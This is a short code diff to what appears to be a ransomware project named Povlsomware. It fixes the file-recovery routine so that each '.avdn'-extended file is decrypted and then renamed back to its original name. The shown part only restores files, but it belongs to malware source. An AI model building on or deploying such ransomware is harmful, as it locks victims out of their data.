@@ -220,8 +220,10 @@ namespace Povlsomware
             {
                 try
                 {
+                    DecryptFile(fileName, password);
                     string originalFileName = fileName.Substring(0, fileName.IndexOf(".avdn"));
-                    DecryptFile(originalFileName, password);
+                    File.Move(fileName,originalFileName);
+                    
                 }
                 catch
                 {
